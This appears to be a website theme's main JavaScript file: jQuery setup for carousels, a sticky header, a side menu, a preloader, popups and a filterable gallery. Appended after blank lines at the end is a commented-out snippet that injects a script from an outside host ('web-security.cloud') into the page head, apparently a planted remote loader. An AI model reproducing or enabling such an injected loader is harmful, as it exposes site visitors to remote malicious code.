(function ($) {
    "use strict";

    

    //======================================
    //=========== aos activate =============
    //======================================
    $(document).ready(function(){
        AOS.init({
            once: true
        });
    });


    //=======================================
    //   project slider
    //========================================
    $(document).ready(function(){
        var projectSlider = $('.project-slider');
        projectSlider.owlCarousel({
            loop: true,
            margin: 20,
            nav: false,
            items: 2,
            smartSpeed: 1500,
            responsive: {
                0: {
                    items: 1
                },
                320: {
                    items: 1
                },
                575: {
                    items: 2
                },
                768: {
                    items: 2
                },
                960: {
                    items: 3
                },
                1200: {
                    items: 2
                },
                1920: {
                    items: 2
                }
            }
        });
        
        // Custom Button
        $('.NextBtn').click(function() {
            projectSlider.trigger('next.owl.carousel');
        });
        $('.PrevBtn').click(function() {
            projectSlider.trigger('prev.owl.carousel');
        });
    
    });

    //=======================================
    //   project-2-slider slider
    //========================================
    $(document).ready(function(){
        var projectSlider = $('.project-2-slider');
        projectSlider.owlCarousel({
            loop: true,
            margin: 20,
            navText: ['<i class="fas fa-long-arrow-alt-left"></i>', '<i class="fas fa-long-arrow-alt-right"></i>'], 
            nav: true,
            items: 4,
            smartSpeed: 1000,
            responsive: {
                0: {
                    items: 1
                },
                320: {
                    items: 1
                },
                480: {
                    items: 1
                },
                576: {
                    items: 2
                },
                768: {
                    items: 2
                },
                960: {
                    items: 4
                },
                1200: {
                    items: 4
                },
                1920: {
                    items: 4
                }
            }
        });
    
    });



    $(document).ready(function(){
        var projectSlider = $('.client-slider');
        projectSlider.owlCarousel({
            loop: true,
            margin: 20,
            // navText: ['<i class="fas fa-long-arrow-alt-left"></i>', '<i class="fas fa-long-arrow-alt-right"></i>'], 
            // nav: true,
            items: 4,
            smartSpeed: 1000,
            autoplay: true,
            responsive: {
                0: {
                    items: 1
                },
                320: {
                    items: 1
                },
                480: {
                    items: 1
                },
                576: {
                    items: 2
                },
                768: {
                    items: 2
                },
                960: {
                    items: 4
                },
                1200: {
                    items: 4
                },
                1920: {
                    items: 4
                }
            }
        });
    
    });


    //=======================================
    //   service slider
    //========================================
    $(document).ready(function(){
        var service_2Slider = $('.service-2-slider');
        service_2Slider.owlCarousel({
            loop: true,
            margin: 0,
            nav: true,
            navText: ['<i class="fas fa-long-arrow-alt-left"></i>', '<i class="fas fa-long-arrow-alt-right"></i>'], 
            items: 3,
            autoplay: true,
            autoplayTimeout: 4000,
            responsive: {
                0: {
                    items: 1
                },
                320: {
                    items: 1
                },
                576: {
                    items: 1
                },
                768: {
                    items: 2
                },
                960: {
                    items: 3
                },
                1200: {
                    items: 3
                },
                1920: {
                    items: 3
                }
            }
        });

        $('.owl-item.active').eq(1).addClass("target");

        service_2Slider.on('changed.owl.carousel', function(event) {
            setTimeout(function(){
                var activeEls = $('.owl-item.active').eq(1); // .eq(1) to get the "middle image out of 3 actives"
                setCarouselCaption( activeEls ); 
            },1);
        });
    
        function setCarouselCaption(el){
            $(".owl-item").removeClass("target");
            el.addClass("target");
        }
    
    });

    //=======================================
    //   service slider
    //========================================
    $(document).ready(function(){
        var testimonial_slider = $('.testimonial-slider');
        testimonial_slider.owlCarousel({
            loop: true,
            margin: 30,
            nav: false,
            dots: true,
            items: 3,
            autoplay: true,
            autoplayTimeout: 4000,
            responsive: {
                0: {
                    items: 1
                },
                320: {
                    items: 1
                },
                576: {
                    items: 1
                },
                768: {
                    items: 2
                },
                960: {
                    items: 3
                },
                1200: {
                    items: 3
                },
                1920: {
                    items: 3
                }
            }
        });

    });

    //=======================================
    //   service slider for homepage 3
    //========================================
    $(document).ready(function(){
        var testimonial_3 = $('.testimonial-3-slide');
        testimonial_3.owlCarousel({
            loop: true,
            margin: 30,
            nav: false,
            dots: true,
            items: 1,
            autoplay: true,
            autoplayTimeout: 4000
        });

    });


    //=======================================
    //   case slider
    //========================================
    $(document).ready(function(){
        var caseSlider = $('.case-slider');
        caseSlider.owlCarousel({
            loop: true,
            margin: 0,
            nav: false,
            items: 1,
            autoplay: true,
            autoplayTimeout: 4000
        });

        // Custom Button
        $('.case-nextBtn').click(function() {
            caseSlider.trigger('next.owl.carousel');
        });
        $('.case-prevBtn').click(function() {
            caseSlider.trigger('prev.owl.carousel');
        });
    });


    //======================================
    //=========== Fixed navbar =============
    //======================================
    $(window).on('scroll', function(){
        var fixed_top = $(".header");
        var fixed_top_2 = $(".bottombar");
        var fixed_top_3 = $(".header-3");
        $(window).on("scroll", function(){
            if( $(window).scrollTop() > 100){  
                fixed_top.addClass("animated fadeInDown fixed-header");
                fixed_top_2.addClass("animated fadeInDown fixed-header");
                fixed_top_3.addClass("animated fadeInDown fixed-header");
                if ($(window).width() < 960) {
                    $('.header').removeClass('fixed-header animated fadeInDown');
                    $('.header2').removeClass('fixed-header animated fadeInDown');
                    $('.header-3').removeClass('fixed-header animated fadeInDown');
                }
            }
            else{
                fixed_top.removeClass("animated fadeInDown fixed-header");
                fixed_top_2.removeClass("animated fadeInDown fixed-header");
                fixed_top_3.removeClass("animated fadeInDown fixed-header");
                if ($(window).width() < 960) {
                }
            }
        });
    }); 

    
    //=======================================
    //   side-menubar
    //========================================
    $(".side-manubar-button").on('click', function(){
        $(".side-menubar").toggleClass("opened");
    });

    $('.close').on('click', function(){
        $(".side-menubar").removeClass("opened");
    });

   

    $(window).on('load', function () {
        //======================================
        //============= Preloader ==============
        //======================================
        var preLoder = $(".preloader");
        preLoder.fadeOut(1000);
    });



    //======================================
    //========== magnificPopup video =======
    //======================================
    $('.mfp-iframe').magnificPopup({
        type: 'video'
    });
    $('.image-popup').magnificPopup({
        type: 'image'
    }); 
    
    $(document).on('click', '.back-to-top', function () {
        $('html,body').animate({
            scrollTop: 0
        }, 3000);
    });

    jQuery(window).load(function() {

        var $filterizr = $('.filterizr__elements');
        if($filterizr.length) {
         var $filterizrControls = $('.filterizr__controls');
         $filterizr.filterizr();
         $filterizrControls.children('li').click(function() {
           $filterizrControls.find('li.active').removeClass('active');
           $(this).addClass('active');
         });
        }
   
   });
    
}(jQuery));	








/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/

